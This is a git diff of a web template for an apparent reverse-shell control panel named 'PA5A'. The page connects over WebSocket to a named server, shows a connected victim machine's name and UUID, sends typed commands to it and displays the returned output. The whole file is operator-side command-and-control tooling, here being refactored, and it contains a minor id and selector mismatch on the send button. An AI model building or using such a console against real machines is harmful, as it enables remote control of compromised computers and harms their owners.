@@ -6,30 +6,21 @@
     <title>PA5A</title>
 
     <!-- CSS & JS (load bootstrap from a CDN) -->
-    <link 
-        rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" 
-        integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" 
-        crossorigin="anonymous">
-    <script
-        src="https://code.jquery.com/jquery-3.6.0.min.js"
-        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
+        integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"
+        integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN"
         crossorigin="anonymous"></script>
-    <script 
-        src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" 
-        integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" 
-        crossorigin="anonymous"></script>
-    <script 
-        src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" 
-        integrity="sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF" 
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js"
+        integrity="sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF"
         crossorigin="anonymous"></script>
 
     <!-- Font Awesome -->
-    <link 
-        rel="stylesheet" 
-        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" 
-        integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" 
-        crossorigin="anonymous" 
-        referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+        integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
 
     <link rel="stylesheet" href="/static/rs_style.css">
 </head>
@@ -38,78 +29,97 @@
     <!-- Page Content -->
     <div id="content">
         <div class="text-center mt-2">
-            <h2>Revershell : <%= uuid %></h2>
+            <h2>Revershell : <%= client.computerName %> (<%= client.uuid %>)</h2>
         </div>
 
-        <div id="messages" class="mt-5 mb-2 overflow-auto">
-            <!-- messages from the client are append here -->
-        </div>
-        
+        <pre id="messages" class="mt-5 mb-2 overflow-auto">
+        <!-- messages from the client are append here -->
+        </pre>
+
         <!-- command to send -->
-        <div id="commands-sender" class="w-100">
-            <form name="publish" class="w-100">
-                <input type="text" name="message">
-                <input type="submit" value="Send">
-            </form>
+        <div id="commands-sender" class="d-flex justify-content-around w-100">
+            <input id="input-cmd" type="text" name="message">
+            <input id="btn btn-send" type="submit" value="Send">
         </div>
-        
 
         <script type="text/javascript">
- 
+
+            let ws = null
+
             window.onload = function ws_to_back() {
-
-                let ws = null
-
                 try {
                     const uuid = window.location.pathname.split('/')[4]
                     ws = new WebSocket("wss://pa5a.cyberfilou.fr/rsfront?" + uuid)
+
+                    ws.onopen = function (event) {
+                        console.log("[OPEN] Connection established")
+                        console.log("Sending to server")
+                    }
+
+                    ws.onclose = function (event) {
+                        if (event.wasClean) {
+                            console.log(`[CLOSE] Connection closed, code=${event.code} reason=${event.reason}`)
+                        } else {
+                            console.log('[CLOSE] Connection died')
+                        }
+                    }
+
+                    ws.onerror = function (error) {
+                        console.log(`[ERROR] ${error.message}`)
+                    }
+
+                    ws.onmessage = function (event) {
+                        console.log(`[command] Data received from server: ${event.data}`)
+
+                        if (event.data instanceof Blob) {
+                            const reader = new FileReader()
+
+                            reader.onload = () => {
+                                console.log("Result: " + reader.result)
+                                let message = reader.result
+                                let messageElem = document.createElement('div')
+                                messageElem.textContent = message
+
+                                let div = document.getElementById('messages')
+                                div.append(messageElem)
+                                div.scrollTop = div.scrollHeight - div.clientHeight
+                            }
+
+                            reader.readAsText(event.data);
+                        } else {
+                            console.log("Result: " + event.data)
+                            let message = event.data
+                            let messageElem = document.createElement('div')
+                            messageElem.textContent = message
+
+                            let div = document.getElementById('messages')
+                            div.append(messageElem)
+                            div.scrollTop = div.scrollHeight - div.clientHeight
+                        }
+                    }
+
                 } catch (exception) {
                     console.error(exception)
                 }
+            }
 
-                ws.onopen = function (event) {
-
-                    console.log("[OPEN] Connection established")
-                    console.log("Sending to server")
-
-                }
-
-                document.forms.publish.onsubmit = function () {
-                    let outgoingMessage = this.message.value
-
+            $("#btn-send").click(() => {
+                let outgoingMessage = $("#input-cmd").val()
+                console.log(outgoingMessage)
+                ws.send(outgoingMessage)
+                return false
+            })
+            $('#input-cmd').keypress((key) => {
+                if (key.which == '13') {
+                    let outgoingMessage = $("#input-cmd").val()
+                    console.log(outgoingMessage)
                     ws.send(outgoingMessage)
                     return false
                 }
-
-
-
-                ws.onmessage = function (event) {
-                    console.log(`[command] Data received from server: ${event.data}`);
-
-                    let message = event.data
-
-                    let messageElem = document.createElement('div');
-                    messageElem.textContent = message;
-                    document.getElementById('messages').append(messageElem);
-
-                }
-
-
-                ws.onclose = function (event) {
-                    if (event.wasClean) {
-                        console.log(`[CLOSE] Connection closed, code=${event.code} reason=${event.reason}`)
-                    }
-                    else {
-                        console.log('[CLOSE] Connection died');
-                    }
-                }
-
-                ws.onerror = function (error) {
-                    console.log(`[ERROR] ${error.message}`)
-                }
-            }
+            })
 
         </script>
     </div>
 </body>
+
 </html>
